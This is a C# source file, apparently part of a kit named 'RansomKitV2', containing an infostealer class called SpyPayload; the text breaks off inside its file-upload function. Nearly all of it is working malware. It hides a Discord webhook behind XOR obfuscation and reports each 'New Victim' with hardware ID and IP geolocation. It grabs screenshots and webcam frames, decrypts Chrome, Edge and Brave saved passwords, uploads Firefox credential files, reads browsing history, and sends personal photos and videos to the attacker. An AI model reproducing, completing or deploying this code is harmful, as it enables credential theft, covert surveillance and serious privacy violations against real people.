using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Data.Sqlite;
using OpenCvSharp;

namespace RansomKitV2
{
    public static class SpyPayload
    {
        // Encrypted webhook — plaintext never appears in binary
        private static readonly byte[] _encHook = new byte[]
        {
            0xF6, 0x4C, 0xDB, 0x12, 0x2D, 0xA5, 0xDD, 0x4F, 0x72, 0xDE, 0x50, 0xDD, 0x3C, 0xB2, 0x4A, 0x95,
            0x09, 0x9B, 0x4D, 0x0C, 0xDA, 0x0A, 0x82, 0x81, 0x62, 0xEE, 0x44, 0x8E, 0x61, 0xC9, 0xA1, 0x4E,
            0x51, 0xE9, 0x7A, 0xB4, 0x89, 0x8F, 0xE5, 0x71, 0x06, 0xA2, 0x73, 0xE6, 0x0A, 0x92, 0x3B, 0xAC,
            0x7E, 0xE3, 0x37, 0xF3, 0x74, 0xAC, 0x52, 0xF7, 0x4F, 0xFE, 0x54, 0xF5, 0x38, 0xA0, 0xF2, 0x1C,
            0x27, 0xB4, 0x3D, 0xF5, 0xF5, 0x1D, 0x53, 0xD4, 0xA3, 0x13, 0x25, 0xB3, 0x49, 0xD3, 0x14, 0xB4,
            0x4F, 0xC4, 0x25, 0xB2, 0x2F, 0x8F, 0x5B, 0x0F, 0xB0, 0x11, 0x8C, 0x4A, 0x77, 0xDF, 0xCD, 0x31,
            0x6B, 0xF0, 0x79, 0xFB, 0xBF, 0x46, 0x2B, 0xCB, 0xB9, 0x34, 0xE8, 0x7C, 0x85, 0x13, 0x00, 0x98,
            0x4F, 0xE5, 0x74, 0xFB, 0x29, 0xB7, 0x2D, 0x7C, 0xA4,
        };

        private static readonly byte[] _xorKey = new byte[]
        {
            0x9E, 0x3F, 0xA1, 0x77, 0x42, 0xBC, 0xD8, 0x51,
            0x2E, 0x88, 0x65, 0xF3, 0x07, 0x9B, 0x4C, 0xD2,
            0x1A, 0x83, 0x5E, 0xA6, 0x37, 0xE9, 0x71, 0x0F,
            0xBD, 0x24, 0x90, 0x5B, 0xCA, 0x6D, 0x18, 0xE4
        };

        private static readonly string WebhookUrl = DecryptHook(_encHook);

        private static readonly string[] ImageExtensions =
        {
            ".jpg", ".jpeg", ".png", ".bmp", ".gif",
            ".webp", ".tiff", ".heic", ".raw", ".cr2", ".nef"
        };

        private static readonly string[] VideoExtensions =
        {
            ".mp4", ".mov", ".avi", ".mkv", ".wmv",
            ".flv", ".webm", ".m4v", ".3gp"
        };

        private const long MaxFileSizeBytes = 5 * 1024 * 1024;

        private static readonly string[] UserSubFolders =
        {
            "Pictures", "Videos", "Documents", "Desktop", "Downloads",
            "OneDrive", Path.Combine("OneDrive", "Pictures"),
            Path.Combine("OneDrive", "Videos"),
            "Camera Roll", "Saved Pictures", "Screenshots", "Photos",
        };

        private static readonly string[] ExcludedPathSegments =
        {
            "appdata", "programdata", "program files", "program files (x86)", "windowsapps",
            "steam", "steamapps", "epic games", "riot games", "origin games",
            "google\\chrome", "mozilla\\firefox", "microsoft\\edge",
            "brave software", "vivaldi", "opera software",
            "discord", "slack", "zoom", "teams", "telegram desktop",
            "adobe\\adobe photoshop", "adobe\\adobe premiere",
            "vlc", "potplayer", "virtualbox", "vmware",
            "windows\\", "windows\\system32", "windows\\syswow64",
            "system volume information", "$recycle.bin", "recovery",
            "visual studio", ".vs", "jetbrains", "android studio",
            "node_modules", "nvidia corporation",
            "microsoft\\windows", "microsoft office",
        };

        public static async Task ExecuteAsync()
        {
            try
            {
                string hwid = GetHWID();
                string username = Environment.UserName;
                string os = Environment.OSVersion.ToString();
                string pcName = Environment.MachineName;

                var (ip, city, region, country, lat, lon, isp, timezone) = await GetGeoInfo();

                string mapsLink = (lat != 0 || lon != 0)
                    ? $"https://www.google.com/maps?q={lat},{lon}"
                    : "unavailable";

                string infoText =
                    $"**🔴 New Victim Connected**\n" +
                    $"**HWID:** `{hwid}`\n" +
                    $"**PC Name:** `{pcName}`\n" +
                    $"**User:** `{username}`\n" +
                    $"**OS:** `{os}`\n\n" +
                    $"**🌐 IP:** `{ip}`\n" +
                    $"**ISP:** `{isp}`\n" +
                    $"**Location:** `{city}, {region}, {country}`\n" +
                    $"**Coordinates:** `{lat}, {lon}`\n" +
                    $"**Timezone:** `{timezone}`\n" +
                    $"**Maps:** {mapsLink}\n\n" +
                    $"**🕒 Time:** {DateTime.Now}";

                await SendMessageToDiscord(infoText);

                // Screenshot
                string ssPath = Path.Combine(Path.GetTempPath(), "ss_" + Guid.NewGuid() + ".png");
                CaptureScreenshot(ssPath);
                if (File.Exists(ssPath))
                {
                    await SendFileToDiscord(ssPath, "Screenshot.png");
                    File.Delete(ssPath);
                }

                // Webcam
                await CaptureAndSendWebcam();

                // Browser creds + history
                await StealBrowserCredentials();
                await StealBrowserHistory();

                // Media harvest
                await ExfilUserProfiles();
            }
            catch { }
        }

        // ─── WEBCAM ──────────────────────────────────────────────────────────

        static async Task CaptureAndSendWebcam()
        {
            VideoCaptureAPIs[] backends =
            {
                VideoCaptureAPIs.DSHOW,
                VideoCaptureAPIs.MSMF,
                VideoCaptureAPIs.ANY
            };
            int[] indexes = { 0, 1, 2 };

            foreach (var backend in backends)
            {
                foreach (int idx in indexes)
                {
                    try
                    {
                        using var cap = new VideoCapture(idx, backend);
                        if (!cap.IsOpened()) { cap.Release(); continue; }

                        using var frame = new Mat();
                        bool gotFrame = false;

                        for (int i = 0; i < 15; i++)
                        {
                            using var tmp = new Mat();
                            try
                            {
                                if (cap.Read(tmp) && !tmp.Empty() && tmp.Width > 10)
                                {
                                    tmp.CopyTo(frame);
                                    gotFrame = true;
                                    break;
                                }
                            }
                            catch { }
                            Thread.Sleep(300);
                        }

                        if (!gotFrame) { cap.Release(); continue; }

                        string camPath = Path.Combine(Path.GetTempPath(), $"cam_{Guid.NewGuid()}.jpg");
                        Cv2.ImWrite(camPath, frame);
                        cap.Release();

                        if (File.Exists(camPath) && new FileInfo(camPath).Length > 500)
                        {
                            await SendFileToDiscord(camPath, $"Webcam_{backend}_{idx}.jpg");
                            try { File.Delete(camPath); } catch { }
                            return;
                        }
                        try { File.Delete(camPath); } catch { }
                    }
                    catch { }
                }
            }
        }

        // ─── GEO ──────────────────────────────────────────────────────────────

        static async Task<string> ResolvePublicIp()
        {
            var endpoints = new[]
            {
                "https://api.ipify.org",
                "https://api4.my-ip.io/ip",
                "https://checkip.amazonaws.com",
                "https://icanhazip.com",
                "https://ipecho.net/plain",
            };

            foreach (var url in endpoints)
            {
                try
                {
                    using var c = new HttpClient();
                    c.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
                    c.Timeout = TimeSpan.FromSeconds(5);
                    string raw = (await c.GetStringAsync(url)).Trim();
                    if (!string.IsNullOrEmpty(raw) && raw.Contains('.'))
                        return raw;
                }
                catch { }
            }
            return string.Empty;
        }

        static async Task<(string ip, string city, string region, string country,
                           double lat, double lon, string isp, string timezone)>
            GetGeoInfo()
        {
            string knownIp = await ResolvePublicIp();
            return await TryIpApi(knownIp)
                ?? await TryIpInfo(knownIp)
                ?? await TryIpWho(knownIp)
                ?? (knownIp.Length > 0 ? knownIp : "unavailable", "?", "?", "?", 0, 0, "?", "?");
        }

        static async Task<(string, string, string, string, double, double, string, string)?>
            TryIpApi(string knownIp)
        {
            try
            {
                using var client = new HttpClient();
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
                client.Timeout = TimeSpan.FromSeconds(8);
                string target = knownIp.Length > 0 ? knownIp : string.Empty;
                string url = $"http://ip-api.com/json/{target}?fields=status,country,regionName,city,lat,lon,isp,timezone,query";
                string json = await client.GetStringAsync(url);
                using var doc = JsonDocument.Parse(json);
                var root = doc.RootElement;
                if (root.GetProperty("status").GetString() != "success") return null;
                return (
                    root.GetProperty("query").GetString() ?? "?",
                    root.GetProperty("city").GetString() ?? "?",
                    root.GetProperty("regionName").GetString() ?? "?",
                    root.GetProperty("country").GetString() ?? "?",
                    root.GetProperty("lat").GetDouble(),
                    root.GetProperty("lon").GetDouble(),
                    root.GetProperty("isp").GetString() ?? "?",
                    root.GetProperty("timezone").GetString() ?? "?"
                );
            }
            catch { return null; }
        }

        static async Task<(string, string, string, string, double, double, string, string)?>
            TryIpInfo(string knownIp)
        {
            try
            {
                using var client = new HttpClient();
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
                client.Timeout = TimeSpan.FromSeconds(8);
                string target = knownIp.Length > 0 ? knownIp + "/" : string.Empty;
                string json = await client.GetStringAsync($"https://ipinfo.io/{target}json");
                using var doc = JsonDocument.Parse(json);
                var root = doc.RootElement;
                string ip = knownIp.Length > 0 ? knownIp :
                                 root.TryGetProperty("ip", out var ipP) ? ipP.GetString() ?? "?" : "?";
                string city = root.TryGetProperty("city", out var ciP) ? ciP.GetString() ?? "?" : "?";
                string region = root.TryGetProperty("region", out var reP) ? reP.GetString() ?? "?" : "?";
                string country = root.TryGetProperty("country", out var coP) ? coP.GetString() ?? "?" : "?";
                string org = root.TryGetProperty("org", out var orP) ? orP.GetString() ?? "?" : "?";
                string tz = root.TryGetProperty("timezone", out var tzP) ? tzP.GetString() ?? "?" : "?";
                double lat = 0, lon = 0;
                if (root.TryGetProperty("loc", out var locProp))
                {
                    var parts = locProp.GetString()?.Split(',');
                    if (parts?.Length == 2)
                    {
                        double.TryParse(parts[0], System.Globalization.NumberStyles.Float,
                            System.Globalization.CultureInfo.InvariantCulture, out lat);
                        double.TryParse(parts[1], System.Globalization.NumberStyles.Float,
                            System.Globalization.CultureInfo.InvariantCulture, out lon);
                    }
                }
                return (ip, city, region, country, lat, lon, org, tz);
            }
            catch { return null; }
        }

        static async Task<(string, string, string, string, double, double, string, string)?>
            TryIpWho(string knownIp)
        {
            try
            {
                using var client = new HttpClient();
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
                client.Timeout = TimeSpan.FromSeconds(8);
                string target = knownIp.Length > 0 ? knownIp : string.Empty;
                string json = await client.GetStringAsync($"https://ipwho.is/{target}");
                using var doc = JsonDocument.Parse(json);
                var root = doc.RootElement;
                if (root.TryGetProperty("success", out var s) && !s.GetBoolean()) return null;
                string ip = knownIp.Length > 0 ? knownIp :
                                 root.TryGetProperty("ip", out var ipP) ? ipP.GetString() ?? "?" : "?";
                string city = root.TryGetProperty("city", out var ciP) ? ciP.GetString() ?? "?" : "?";
                string region = root.TryGetProperty("region", out var reP) ? reP.GetString() ?? "?" : "?";
                string country = root.TryGetProperty("country", out var coP) ? coP.GetString() ?? "?" : "?";
                double lat = 0, lon = 0;
                string isp = "?", tz = "?";
                if (root.TryGetProperty("latitude", out var latP)) lat = latP.GetDouble();
                if (root.TryGetProperty("longitude", out var lonP)) lon = lonP.GetDouble();
                if (root.TryGetProperty("connection", out var conn))
                    if (conn.TryGetProperty("isp", out var ispP))
                        isp = ispP.GetString() ?? "?";
                if (root.TryGetProperty("timezone", out var tzObj))
                    if (tzObj.TryGetProperty("id", out var tzId))
                        tz = tzId.GetString() ?? "?";
                return (ip, city, region, country, lat, lon, isp, tz);
            }
            catch { return null; }
        }

        // ─── BROWSER CREDENTIALS ─────────────────────────────────────────────

        static async Task StealBrowserCredentials()
        {
            var report = new StringBuilder();
            report.AppendLine("**🔑 Browser Credentials**");
            report.AppendLine();

            var chromiumProfiles = new Dictionary<string, string>
            {
                ["Chrome"] = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data"),
                ["Edge"] = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Microsoft\Edge\User Data"),
                ["Brave"] = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"BraveSoftware\Brave-Browser\User Data"),
                ["Opera"] = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Opera Software\Opera Stable"),
                ["Vivaldi"] = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Vivaldi\User Data"),
                ["OperaGX"] = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Opera Software\Opera GX Stable"),
            };

            foreach (var browser in chromiumProfiles)
            {
                string userData = browser.Value;
                if (!Directory.Exists(userData)) continue;

                byte[]? masterKey = GetChromiumMasterKey(userData);
                if (masterKey == null) continue;

                var profileDirs = new List<string> { "Default" };
                for (int i = 1; i <= 20; i++) profileDirs.Add($"Profile {i}");

                foreach (var profileDir in profileDirs)
                {
                    string loginDb = Path.Combine(userData, profileDir, "Login Data");
                    if (!File.Exists(loginDb)) continue;

                    var creds = ReadChromiumLogins(loginDb, masterKey);
                    if (creds.Count == 0) continue;

                    report.AppendLine($"**🌐 {browser.Key}** (`{profileDir}`) — `{creds.Count}` login(s)");

                    foreach (var c in creds)
                    {
                        report.AppendLine(
                            $"> 🔗 `{Truncate(c.url, 100)}`\n" +
                            $"> 👤 `{c.username}`\n" +
                            $"> 🔒 `{c.password}`");
                        report.AppendLine();

                        if (report.Length > 1800)
                        {
                            await SendMessageToDiscord(report.ToString());
                            report.Clear();
                        }
                    }
                }
            }

            // Firefox
            string ffRoot = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"Mozilla\Firefox\Profiles");

            if (Directory.Exists(ffRoot))
            {
                report.AppendLine("**🦊 Firefox** — raw files attached");

                foreach (var profileDir in Directory.EnumerateDirectories(ffRoot))
                {
                    string loginsJson = Path.Combine(profileDir, "logins.json");
                    string key4db = Path.Combine(profileDir, "key4.db");
                    string profileName = Path.GetFileName(profileDir);

                    if (!File.Exists(loginsJson)) continue;

                    await SendFileToDiscord(loginsJson, $"FF_{profileName}_logins.json");
                    if (File.Exists(key4db))
                        await SendFileToDiscord(key4db, $"FF_{profileName}_key4.db");
                }
            }

            if (report.Length > 30)
                await SendMessageToDiscord(report.ToString());
        }

        static string Truncate(string s, int max)
            => string.IsNullOrEmpty(s) ? "" : (s.Length <= max ? s : s[..max] + "…");

        static byte[]? GetChromiumMasterKey(string userDataPath)
        {
            try
            {
                string localStatePath = Path.Combine(userDataPath, "Local State");
                if (!File.Exists(localStatePath)) return null;

                string json = File.ReadAllText(localStatePath);
                using var doc = JsonDocument.Parse(json);

                if (!doc.RootElement.TryGetProperty("os_crypt", out var osc)) return null;
                if (!osc.TryGetProperty("encrypted_key", out var ekp)) return null;

                string b64Key = ekp.GetString() ?? "";
                if (b64Key.Length == 0) return null;

                byte[] encryptedKey = Convert.FromBase64String(b64Key);
                if (encryptedKey.Length < 5) return null;
                if (Encoding.ASCII.GetString(encryptedKey, 0, 5) != "DPAPI") return null;

                byte[] withoutPrefix = encryptedKey[5..];
                return ProtectedData.Unprotect(withoutPrefix, null, DataProtectionScope.CurrentUser);
            }
            catch { return null; }
        }

        static List<(string url, string username, string password)> ReadChromiumLogins(
            string dbPath, byte[] masterKey)
        {
            var results = new List<(string, string, string)>();
            string tmpDb = Path.Combine(Path.GetTempPath(), Guid.NewGuid() + ".db");

            try
            {
                if (!CopyDatabaseWithSidecars(dbPath, tmpDb)) return results;

                using var connection = new SqliteConnection($"Data Source={tmpDb};Mode=ReadOnly;Pooling=False");
                connection.Open();

                using var cmd = connection.CreateCommand();
                cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";

                using var reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    string url = reader.GetString(0);
                    string username = reader.GetString(1);
                    byte[] pwBlob = (byte[])reader["password_value"];

                    var (password, isV20) = DecryptChromiumPassword(pwBlob, masterKey);

                    if (isV20)
                        results.Add((url, username, "[v20-app-bound]"));
                    else if (!string.IsNullOrWhiteSpace(password))
                        results.Add((url, username, password));
                    else if (!string.IsNullOrWhiteSpace(username))
                        results.Add((url, username, "[decrypt-failed]"));
                }
            }
            catch { }
            finally { CleanupTempDb(tmpDb); }

            return results;
        }

        static (string password, bool isV20) DecryptChromiumPassword(byte[] blob, byte[] masterKey)
        {
            try
            {
                if (blob == null || blob.Length < 3) return ("", false);

                if (blob[0] == (byte)'v' && blob[1] == (byte)'1' &&
                    (blob[2] == (byte)'0' || blob[2] == (byte)'1'))
                {
                    if (blob.Length < 3 + 12 + 16) return ("", false);
                    byte[] nonce = blob[3..15];
                    byte[] tag = blob[^16..];
                    byte[] ciphertext = blob[15..^16];
                    return (AesGcmDecrypt(masterKey, nonce, ciphertext, tag), false);
                }

                if (blob[0] == (byte)'v' && blob[1] == (byte)'2' && blob[2] == (byte)'0')
                    return ("", true);

                try
                {
                    byte[] decrypted = ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser);
                    return (Encoding.UTF8.GetString(decrypted).TrimEnd('\0'), false);
                }
                catch { return ("", false); }
            }
            catch { return ("", false); }
        }

        static string AesGcmDecrypt(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
        {
            try
            {
                using var aes = new AesGcm(key, 16);
                byte[] plaintext = new byte[ciphertext.Length];
                aes.Decrypt(nonce, ciphertext, tag, plaintext);
                return Encoding.UTF8.GetString(plaintext).TrimEnd('\0');
            }
            catch { return ""; }
        }

        // ─── BROWSER HISTORY ─────────────────────────────────────────────────

        static async Task StealBrowserHistory()
        {
            var report = new StringBuilder();
            report.AppendLine("**🧭 Browser History**");
            report.AppendLine();

            var chromiumProfiles = new Dictionary<string, string>
            {
                ["Chrome"] = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data"),
                ["Edge"] = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Microsoft\Edge\User Data"),
                ["Brave"] = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"BraveSoftware\Brave-Browser\User Data"),
                ["Opera"] = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Opera Software\Opera Stable"),
                ["Vivaldi"] = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Vivaldi\User Data"),
                ["OperaGX"] = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Opera Software\Opera GX Stable"),
            };

            const int MaxPerProfile = 50;
            int grandTotal = 0;

            foreach (var browser in chromiumProfiles)
            {
                if (!Directory.Exists(browser.Value)) continue;

                var profileDirs = new List<string> { "Default" };
                for (int i = 1; i <= 20; i++) profileDirs.Add($"Profile {i}");

                foreach (var profileDir in profileDirs)
                {
                    string histPath = Path.Combine(browser.Value, profileDir, "History");
                    if (!File.Exists(histPath)) continue;

                    var rows = ReadChromiumHistory(histPath, MaxPerProfile);
                    if (rows.Count == 0) continue;

                    grandTotal += rows.Count;
                    report.AppendLine($"**🌐 {browser.Key}** (`{profileDir}`) — `{rows.Count}` visit(s)");

                    foreach (var r in rows)
                    {
                        string t = string.IsNullOrWhiteSpace(r.title) ? "(no title)" : r.title;
                        report.AppendLine(
                            $"> `{r.visited:yyyy-MM-dd HH:mm}` — `{Truncate(r.url, 90)}`\n" +
                            $"> _{Truncate(t, 100)}_");
                    }
                    report.AppendLine();

                    if (report.Length > 1700)
                    {
                        await SendMessageToDiscord(report.ToString());
                        report.Clear();
                    }
                }
            }

            string ffRoot = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"Mozilla\Firefox\Profiles");

            if (Directory.Exists(ffRoot))
            {
                foreach (var profileDir in Directory.EnumerateDirectories(ffRoot))
                {
                    string places = Path.Combine(profileDir, "places.sqlite");
                    if (!File.Exists(places)) continue;

                    var rows = ReadFirefoxHistory(places, MaxPerProfile);
                    if (rows.Count == 0) continue;

                    grandTotal += rows.Count;
                    string profileName = Path.GetFileName(profileDir);
                    report.AppendLine($"**🦊 Firefox** (`{profileName}`) — `{rows.Count}` visit(s)");

                    foreach (var r in rows)
                    {
                        string t = string.IsNullOrWhiteSpace(r.title) ? "(no title)" : r.title;
                        report.AppendLine(
                            $"> `{r.visited:yyyy-MM-dd HH:mm}` — `{Truncate(r.url, 90)}`\n" +
                            $"> _{Truncate(t, 100)}_");
                    }
                    report.AppendLine();

                    if (report.Length > 1700)
                    {
                        await SendMessageToDiscord(report.ToString());
                        report.Clear();
                    }
                }
            }

            report.AppendLine($"**📈 history totals:** `{grandTotal}` entries");

            if (report.Length > 30)
                await SendMessageToDiscord(report.ToString());
        }

        static List<(string url, string title, DateTime visited)> ReadChromiumHistory(string dbPath, int max)
        {
            var results = new List<(string, string, DateTime)>();
            string tmpDb = Path.Combine(Path.GetTempPath(), Guid.NewGuid() + ".hdb");

            try
            {
                if (!CopyDatabaseWithSidecars(dbPath, tmpDb)) return results;

                using var connection = new SqliteConnection($"Data Source={tmpDb};Mode=ReadOnly;Pooling=False");
                connection.Open();

                using var cmd = connection.CreateCommand();
                cmd.CommandText =
                    "SELECT url, title, last_visit_time FROM urls " +
                    "WHERE url NOT LIKE 'chrome-extension://%' " +
                    "AND url NOT LIKE 'chrome://%' " +
                    "AND url NOT LIKE 'edge://%' " +
                    "AND url NOT LIKE 'brave://%' " +
                    "AND url NOT LIKE 'opera://%' " +
                    "AND url NOT LIKE 'vivaldi://%' " +
                    "AND url NOT LIKE 'devtools://%' " +
                    "ORDER BY last_visit_time DESC LIMIT @n";
                cmd.Parameters.AddWithValue("@n", max);

                using var reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    string url = reader.IsDBNull(0) ? "" : reader.GetString(0);
                    string title = reader.IsDBNull(1) ? "" : reader.GetString(1);
                    long wt = reader.IsDBNull(2) ? 0 : reader.GetInt64(2);
                    DateTime when = WebkitTimeToDateTime(wt);
                    results.Add((url, title, when));
                }
            }
            catch { }
            finally { CleanupTempDb(tmpDb); }

            return results;
        }

        static List<(string url, string title, DateTime visited)> ReadFirefoxHistory(string dbPath, int max)
        {
            var results = new List<(string, string, DateTime)>();
            string tmpDb = Path.Combine(Path.GetTempPath(), Guid.NewGuid() + ".fdb");

            try
            {
                if (!CopyDatabaseWithSidecars(dbPath, tmpDb)) return results;

                using var connection = new SqliteConnection($"Data Source={tmpDb};Mode=ReadOnly;Pooling=False");
                connection.Open();

                using var cmd = connection.CreateCommand();
                cmd.CommandText =
                    "SELECT url, title, last_visit_date FROM moz_places " +
                    "WHERE url NOT LIKE 'moz-extension://%' " +
                    "AND url NOT LIKE 'about:%' " +
                    "AND url NOT LIKE 'place:%' " +
                    "AND last_visit_date IS NOT NULL " +
                    "ORDER BY last_visit_date DESC LIMIT @n";
                cmd.Parameters.AddWithValue("@n", max);

                using var reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    string url = reader.IsDBNull(0) ? "" : reader.GetString(0);
                    string title = reader.IsDBNull(1) ? "" : reader.GetString(1);
                    long pt = reader.IsDBNull(2) ? 0 : reader.GetInt64(2);
                    DateTime when = FirefoxTimeToDateTime(pt);
                    results.Add((url, title, when));
                }
            }
            catch { }
            finally { CleanupTempDb(tmpDb); }

            return results;
        }

        static bool CopyDatabaseWithSidecars(string srcPath, string dstPath)
        {
            try
            {
                using (var fs = new FileStream(srcPath, FileMode.Open, FileAccess.Read,
                    FileShare.ReadWrite | FileShare.Delete))
                using (var outFs = File.Create(dstPath))
                    fs.CopyTo(outFs);

                TryCopy(srcPath + "-wal", dstPath + "-wal");
                TryCopy(srcPath + "-shm", dstPath + "-shm");

                return true;
            }
            catch { return false; }
        }

        static void TryCopy(string src, string dst)
        {
            try
            {
                if (!File.Exists(src)) return;
                using var fs = new FileStream(src, FileMode.Open, FileAccess.Read,
                    FileShare.ReadWrite | FileShare.Delete);
                using var outFs = File.Create(dst);
                fs.CopyTo(outFs);
            }
            catch { }
        }

        static void CleanupTempDb(string tmpDb)
        {
            try { File.Delete(tmpDb); } catch { }
            try { File.Delete(tmpDb + "-wal"); } catch { }
            try { File.Delete(tmpDb + "-shm"); } catch { }
        }

        static DateTime WebkitTimeToDateTime(long webkitMicros)
        {
            try
            {
                if (webkitMicros <= 0) return DateTime.MinValue;
                long fileTimeTicks = webkitMicros * 10;
                if (fileTimeTicks <= 0) return DateTime.MinValue;
                try { return DateTime.FromFileTimeUtc(fileTimeTicks).ToLocalTime(); }
                catch { return DateTime.MinValue; }
            }
            catch { return DateTime.MinValue; }
        }

        static DateTime FirefoxTimeToDateTime(long prMicros)
        {
            try
            {
                if (prMicros <= 0) return DateTime.MinValue;
                long ms = prMicros / 1000;
                return DateTimeOffset.FromUnixTimeMilliseconds(ms).LocalDateTime;
            }
            catch { return DateTime.MinValue; }
        }

        // ─── SCREENSHOT ──────────────────────────────────────────────────────

        static void CaptureScreenshot(string savePath)
        {
            try
            {
                var screen = System.Windows.Forms.Screen.PrimaryScreen;
                if (screen == null) return;
                Rectangle bounds = screen.Bounds;
                using var bitmap = new Bitmap(bounds.Width, bounds.Height);
                using (var g = Graphics.FromImage(bitmap))
                    g.CopyFromScreen(System.Drawing.Point.Empty, System.Drawing.Point.Empty, bounds.Size);
                bitmap.Save(savePath, ImageFormat.Png);
            }
            catch { }
        }

        // ─── MEDIA HARVEST ───────────────────────────────────────────────────

        static async Task ExfilUserProfiles()
        {
            string usersRoot = @"C:\Users";
            var targetProfiles = new[] { Environment.UserName, "Public", "Default" };

            var organized = new Dictionary<string, Dictionary<string, List<string>>>(
                StringComparer.OrdinalIgnoreCase);

            foreach (var profile in targetProfiles)
            {
                string profilePath = Path.Combine(usersRoot, profile);
                if (!Directory.Exists(profilePath)) continue;

                organized[profile] = new Dictionary<string, List<string>>
                {
                    ["Images"] = new List<string>(),
                    ["Videos"] = new List<string>()
                };

                foreach (var sub in UserSubFolders)
                    CollectSafe(Path.Combine(profilePath, sub),
                        organized[profile]["Images"],
                        organized[profile]["Videos"]);

                organized[profile]["Images"] = organized[profile]["Images"]
                    .Distinct(StringComparer.OrdinalIgnoreCase).ToList();
                organized[profile]["Videos"] = organized[profile]["Videos"]
                    .Distinct(StringComparer.OrdinalIgnoreCase).ToList();
            }

            int totalFiles = organized.Values.Sum(d => d.Values.Sum(l => l.Count));
            if (totalFiles == 0) return;

            var summary = new StringBuilder();
            summary.AppendLine("**📊 Media Harvest Summary**");
            summary.AppendLine($"**Total files:** `{totalFiles}`");
            foreach (var kv in organized)
            {
                int imgs = kv.Value["Images"].Count;
                int vids = kv.Value["Videos"].Count;
                if (imgs + vids == 0) continue;
                summary.AppendLine($"👤 **{kv.Key}** — 🖼️ `{imgs}` | 🎬 `{vids}`");
            }
            await SendMessageToDiscord(summary.ToString());

            const int BatchSize = 5;
            foreach (var profilePair in organized)
            {
                foreach (var catPair in profilePair.Value)
                {
                    var files = catPair.Value;
                    if (files.Count == 0) continue;

                    string emoji = catPair.Key == "Images" ? "🖼️" : "🎬";
                    await SendMessageToDiscord(
                        $"──────────────────────────\n" +
                        $"{emoji} **{catPair.Key}** — `{profilePair.Key}` — `{files.Count}` file(s)\n" +
                        $"──────────────────────────");

                    int batchNum = 1;
                    for (int i = 0; i < files.Count; i += BatchSize)
                    {
                        var batch = files.Skip(i).Take(BatchSize).ToList();
                        await SendOrganizedBatch(batch, profilePair.Key, catPair.Key, batchNum++);
                        await Task.Delay(900);
                    }
                }
            }

            await SendMessageToDiscord("**✅ Media harvest complete.**");
        }

        static void CollectSafe(string folderPath, List<string> images, List<string> videos)
        {
            if (!Directory.Exists(folderPath)) return;
            if (IsSoftwarePath(folderPath)) return;

            var stack = new Stack<string>();
            stack.Push(folderPath);

            while (stack.Count > 0)
            {
                string dir = stack.Pop();
                if (IsSoftwarePath(dir)) continue;

                try
                {
                    foreach (var file in Directory.EnumerateFiles(dir))
                    {
                        try
                        {
                            if (IsSoftwarePath(file)) continue;
                            var info = new FileInfo(file);
                            if (info.Length == 0 || info.Length > MaxFileSizeBytes) continue;

                            string ext = Path.GetExtension(file).ToLowerInvariant();
                            if (ImageExtensions.Contains(ext)) images.Add(file);
                            else if (VideoExtensions.Contains(ext)) videos.Add(file);
                        }
                        catch { }
                    }
                }
                catch { }

                try
                {
                    foreach (var sub in Directory.EnumerateDirectories(dir))
                    {
                        if (IsSoftwarePath(sub)) continue;
                        stack.Push(sub);
                    }
                }
                catch { }
            }
        }

        static bool IsSoftwarePath(string fullPath)
        {
            string normalised = fullPath.ToLowerInvariant().Replace('/', '\\');
            foreach (var segment in ExcludedPathSegments)
            {
                string wrapped = "\\" + segment.ToLowerInvariant() + "\\";
                if (normalised.Contains(wrapped)) return true;
                if (normalised.EndsWith("\\" + segment.ToLowerInvariant())) return true;
            }
            return false;
        }

        // ─── DISCORD SEND ────────────────────────────────────────────────────

        static async Task SendMessageToDiscord(string message)
        {
            try
            {
                using var client = new HttpClient();
                client.Timeout = TimeSpan.FromSeconds(15);

                const int MaxLen = 1900;
                for (int i = 0; i < message.Length; i += MaxLen)
                {
                    string chunk = message.Substring(i, Math.Min(MaxLen, message.Length - i));
                    string escaped = chunk
                        .Replace("\\", "\\\\")
                        .Replace("\"", "\\\"")
                        .Replace("\n", "\\n")
                        .Replace("\r", "");
                    var content = new StringContent(
                        $"{{\"content\":\"{escaped}\"}}",
                        Encoding.UTF8, "application/json");
                    await client.PostAsync(WebhookUrl, content);
                    await Task.Delay(300);
                }
            }
            catch { }
        }

        static async Task SendFileToDiscord(string filePath, string fileName)
        {
            try
            {
                using var client = new HttpClient();
                client.Timeout = TimeSpan.FromSeconds(60);
                using var form = new MultipartFormDataContent();
                var fileContent = new ByteArrayContent(File.ReadAllBytes(filePath));
                fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
                form.Add(fileContent, "file", fileName);
                form.Add(new StringContent(fileName), "content");
